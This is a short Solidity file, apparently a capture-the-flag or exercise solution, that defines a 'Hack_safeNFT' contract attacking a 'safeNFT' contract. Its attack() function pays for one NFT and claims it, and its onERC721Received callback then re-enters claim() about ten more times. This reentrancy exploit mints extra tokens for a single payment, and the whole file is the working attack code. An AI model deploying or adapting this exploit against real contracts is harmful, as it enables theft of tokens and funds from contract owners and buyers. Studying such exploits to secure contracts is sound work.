import "./safeNFT.sol";
// SPDX-License-Identifier: UNLICENSED

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

pragma solidity 0.8.7;

contract Hack_safeNFT {
    uint public count;

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        if (count <= 10) {
            count = count + 1;
            safeNFT(msg.sender).claim();
        }
        return IERC721Receiver.onERC721Received.selector;
    }

    function attack(address _target) public payable {
        safeNFT(_target).buyNFT{value: msg.value}();
        safeNFT(_target).claim();
    }
}
